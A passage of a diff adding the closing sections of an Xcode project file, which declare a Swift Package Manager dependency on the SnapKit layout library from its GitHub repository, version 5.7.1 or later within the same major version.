+		};
+/* End XCConfigurationList section */
+
+/* Begin XCRemoteSwiftPackageReference section */
+		FC5C48B92DFCFF2600AAC4F0 /* XCRemoteSwiftPackageReference "SnapKit" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/SnapKit/SnapKit.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 5.7.1;
+			};
+		};
+/* End XCRemoteSwiftPackageReference section */
+
+/* Begin XCSwiftPackageProductDependency section */
+		FC7A74D72DFD075B000F07D3 /* SnapKit */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = FC5C48B92DFCFF2600AAC4F0 /* XCRemoteSwiftPackageReference "SnapKit" */;
+			productName = SnapKit;
+		};
+/* End XCSwiftPackageProductDependency section */
+	};
+	rootObject = FC2134652DFCE8ED000B71D6 /* Project object */;
+}
